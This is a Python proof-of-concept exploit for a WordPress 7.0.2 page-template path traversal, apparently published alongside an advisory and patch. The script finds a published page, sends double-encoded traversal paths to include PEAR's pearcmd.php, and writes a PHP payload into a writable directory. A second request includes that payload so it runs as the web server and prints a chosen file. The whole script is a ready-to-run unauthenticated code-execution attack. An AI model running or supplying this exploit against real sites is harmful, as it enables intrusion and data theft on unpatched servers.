# Exploit Title: WordPress 7.0.2 - Path Travesal 
# Google Dork: N/A
# Date: 2026-09-22
# Exploit Author: Robert Ressl (https://ressl.ch)
# Vendor Homepage: https://wordpress.org
# Software Link: https://wordpress.org/download/releases/
# Version: WordPress 7.0.2 (patched in 7.1.2 and 7.0.6; backports to every branch down to 4.7.37)
# Tested on: WordPress 7.0.2 / PHP 8.3.33 (Apache module) / MySQL 8.4 (official wordpress:7.0.2-php8.3-apache image, x86-64 and arm64)
# CVE: CVE-2026-87902
# Advisory: https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-7hp8-65ch-5whp
# Write-up: https://ressl.ch/blog/cve-2026-87902-wordpress/
# Source: https://github.com/ressl/cve-2026-87902-poc
#
# Requires: Python 3.6+ (standard library only)
# Usage: python3 cve-2026-87902.py --url http://127.0.0.1:8091 [--page-id N] [--depth 7]
#
# Preconditions (the Source repository ships a lab that provides all of them):
#   * a published page that uses the default template (auto-detected via REST, or --page-id)
#   * a top-level `page-*` directory in the active theme (--theme-dir, default page-templates)
#   * a readable PEAR pearcmd.php (--include) and register_argc_argv=On for the web SAPI
#   * a writable directory for the PEAR payload (--output, default /tmp)

"""
CVE-2026-87902 - unauthenticated path traversal in WordPress page-template
resolution leading to local PHP file inclusion (and, where the deployment
allows it, to PHP code execution).

Two anonymous POST requests are enough:

  Stage 1  The traversal makes the template loader include a readable local
           `.php` file outside the theme roots. With PEAR present and
           `register_argc_argv=On`, `/usr/local/lib/php/pearcmd.php` acts as a
           file-write gadget: `config-create` serializes attacker-controlled
           data - including PHP opening tags - into a writable directory.

  Stage 2  The same traversal includes the generated file, so the embedded PHP
           runs with the privileges of the web-server account.

The WordPress defect is the missing path containment. PEAR is only one
environment-dependent way of turning the inclusion into code execution.

For authorized security testing and research only.
"""

import argparse
import http.client
import json
import ssl
import sys
from urllib.parse import urlsplit

# ---------------------------------------------------------------------------
# Design / ANSI helpers (rein kosmetisch, keine Logik)
# ---------------------------------------------------------------------------
class C:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN = "\033[36m"
    WHITE = "\033[37m"
    BG_RED = "\033[41m"
    BG_GREEN = "\033[42m"


def banner():
    art = r"""
   ______     ______    ___   ___  ____  ____   ___ ____  
  / ___/ | / / ____/   |__ \ / _ \|___ \| ___| / _ \|___ \ 
 / /__ | |/ /|  _|       __) | | | | __) |___ \| | | | __) |
 \___/ |___/ |_|        / __/| |_| |/ __/ ___) | |_| |/ __/ 
                       /_____|\___/|_____|____/ \___/|_____|
"""
    print(C.CYAN + C.BOLD + art + C.RESET)
    print(C.DIM + "  CVE-2026-87902  ·  WordPress page-template path traversal  ·  PoC" + C.RESET)
    print(C.DIM + "  " + "─" * 62 + C.RESET)
    print()


def tag(text, color):
    return f"{color}{C.BOLD}[{text}]{C.RESET}"


def info(msg):
    print(f"  {tag('*', C.CYAN)} {msg}")


def good(msg):
    print(f"  {tag('+', C.GREEN)} {msg}")


def bad(msg):
    print(f"  {tag('-', C.RED)} {msg}")


def warn(msg):
    print(f"  {tag('!', C.YELLOW)} {msg}")


def field(label, value):
    print(f"  {C.DIM}{label:<14}{C.RESET}{C.WHITE}{value}{C.RESET}")


def divider():
    print(C.DIM + "  " + "─" * 62 + C.RESET)


# ---------------------------------------------------------------------------
# Ab hier: unveränderte Exploit-Logik
# ---------------------------------------------------------------------------
USER_AGENT = "cve-2026-87902-poc/1.0"

DEFAULT_MARKER = "CVE-2026-87902-POC-OK"
DEFAULT_THEME_DIR = "page-templates"
DEFAULT_INCLUDE = "/usr/local/lib/php/pearcmd"
DEFAULT_OUTPUT = "/tmp/wp-pear-rce-flag"
DEFAULT_READ = "/flag"
LAB_DEPTH = 7


def send_request(base, method, path, body=None, timeout=20.0, insecure=False):
    parts = urlsplit(base)
    if not parts.hostname:
        raise ValueError("invalid target URL: %s" % base)
    if parts.scheme == "https":
        context = ssl._create_unverified_context() if insecure else ssl.create_default_context()
        conn = http.client.HTTPSConnection(
            parts.hostname, parts.port or 443, timeout=timeout, context=context
        )
    else:
        conn = http.client.HTTPConnection(parts.hostname, parts.port or 80, timeout=timeout)
    headers = {
        "User-Agent": USER_AGENT,
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection": "close",
    }
    try:
        conn.request(method, path, body=body, headers=headers)
        response = conn.getresponse()
        return response.status, response.read().decode("utf-8", "replace")
    finally:
        conn.close()


def php_literal(value):
    return ".".join("chr(%d)" % ord(char) for char in value)


def double_encode(path):
    once = path.replace("/", "%2F").replace(".", "%2E")
    return once.replace("%", "%25")


def candidate(theme_dir, depth, target):
    prefix = theme_dir[len("page-"):] if theme_dir.startswith("page-") else theme_dir
    return prefix + "/" + "../" * depth + target.lstrip("/")


def find_page(base, timeout, insecure):
    routes = (
        "/index.php?rest_route=/wp/v2/pages&per_page=100&_fields=id,slug,template",
        "/wp-json/wp/v2/pages?per_page=100&_fields=id,slug,template",
    )
    for route in routes:
        try:
            status, body = send_request(base, "GET", route, timeout=timeout, insecure=insecure)
        except Exception:
            continue
        if status != 200:
            continue
        try:
            pages = json.loads(body)
        except ValueError:
            continue
        if not isinstance(pages, list) or not pages:
            continue
        for page in pages:
            if not page.get("template"):
                return page.get("id"), page.get("slug", ""), route
        return pages[0].get("id"), pages[0].get("slug", ""), route
    return None, None, None


def run_stages(base, args, depth):
    include_path = candidate(args.theme_dir, depth, args.include)
    output_path = candidate(args.theme_dir, depth, args.output)
    payload = "<?=file_get_contents(%s)?>" % php_literal(args.read)

    stage1_target = "/?+config-create+/" + payload + "+" + args.output + ".php"
    stage1_body = "page_id=%d&pagename=%s" % (args.page_id, double_encode(include_path))
    status1, _ = send_request(base, "POST", stage1_target, body=stage1_body,
                              timeout=args.timeout, insecure=args.insecure)

    stage2_body = "page_id=%d&pagename=%s" % (args.page_id, double_encode(output_path))
    status2, text2 = send_request(base, "POST", "/", body=stage2_body,
                                  timeout=args.timeout, insecure=args.insecure)

    return {
        "depth": depth,
        "include_candidate": "page-" + include_path + ".php",
        "output_candidate": "page-" + output_path + ".php",
        "status1": status1,
        "status2": status2,
        "hits": text2.count(args.marker),
        "body": text2,
    }


def first_line_with(text, marker, limit=200):
    index = text.find(marker)
    if index < 0:
        return ""
    chunk = text[index:index + limit]
    return chunk.splitlines()[0] if chunk else ""


def main(argv=None):
    parser = argparse.ArgumentParser(
        description="CVE-2026-87902 - WordPress page-template traversal to local PHP inclusion (PoC)",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("--url", default="http://127.0.0.1:8091", help="WordPress base URL")
    parser.add_argument("--page-id", type=int, help="published page ID (auto-detected via REST if omitted)")
    parser.add_argument("--theme-dir", default=DEFAULT_THEME_DIR,
                        help="top-level `page-*` directory of the active theme")
    parser.add_argument("--include", default=DEFAULT_INCLUDE,
                        help="local file to include in stage 1 (no `.php` suffix)")
    parser.add_argument("--output", default=DEFAULT_OUTPUT,
                        help="writable destination for the PEAR payload (no `.php` suffix)")
    parser.add_argument("--read", default=DEFAULT_READ, help="file printed by the injected PHP")
    parser.add_argument("--marker", default=DEFAULT_MARKER,
                        help="string expected in the stage-2 response on success")
    parser.add_argument("--depth", type=int, default=0,
                        help="number of `..` segments (0 = lab depth first, then 1..12)")
    parser.add_argument("--timeout", type=float, default=20.0, help="per-request timeout in seconds")
    parser.add_argument("--insecure", action="store_true", help="do not verify TLS certificates")
    args = parser.parse_args(argv)

    if not args.theme_dir.startswith("page-"):
        parser.error("--theme-dir must be the real theme directory name and start with 'page-'")

    banner()

    base = args.url.rstrip("/")
    field("Target", base)
    field("CVE", "CVE-2026-87902")
    field("Theme dir", args.theme_dir)
    field("Include", args.include)
    field("Output", args.output)
    divider()

    if args.page_id:
        info(f"Page ID: {C.BOLD}{args.page_id}{C.RESET} (from --page-id)")
    else:
        info("Suche veröffentlichte Seite über REST-API ...")
        page_id, slug, route = find_page(base, args.timeout, args.insecure)
        if not page_id:
            bad("Keine veröffentlichte Seite gefunden — bitte --page-id angeben.")
            return 1
        args.page_id = page_id
        good(f"Page ID: {C.BOLD}{page_id}{C.RESET} ({slug or '?'}, default template, via {route})")

    divider()

    if args.depth:
        depths = [args.depth]
    else:
        depths = [LAB_DEPTH] + [d for d in range(1, 13) if d != LAB_DEPTH]

    for depth in depths:
        result = run_stages(base, args, depth)
        s1 = result["status1"]
        s2 = result["status2"]
        s1_col = C.GREEN if 200 <= s1 < 400 else C.RED
        s2_col = C.GREEN if 200 <= s2 < 400 else C.RED
        print(f"  {C.DIM}depth {depth:>2}{C.RESET}  "
              f"stage1 {s1_col}{s1}{C.RESET}  "
              f"stage2 {s2_col}{s2}{C.RESET}")

        if result["hits"]:
            print()
            good(f"Traversal     : {C.CYAN}{result['include_candidate']}{C.RESET}")
            good(f"Payload file  : {C.CYAN}{result['output_candidate']}{C.RESET}")
            good(f"Marker        : {args.marker!r} ({result['hits']}x)")
            good(f"Proof         : {first_line_with(result['body'], args.marker)}")
            print()
            print(f"  {C.BG_GREEN}{C.BOLD}  EXPLOIT ERFOLGREICH  {C.RESET} "
                  f"{C.GREEN}PHP lief mit Rechten des Web-Servers.{C.RESET}")
            return 0

    print()
    bad("Exploit fehlgeschlagen.")
    print(f"  {C.DIM}Prüfe: lab/up.sh, page-* Verzeichnis, /flag lesbar, Page-ID,")
    print(f"  PEAR erreichbar und register_argc_argv=On für die Web-SAPI.{C.RESET}")
    return 1


if __name__ == "__main__":
    sys.exit(main())
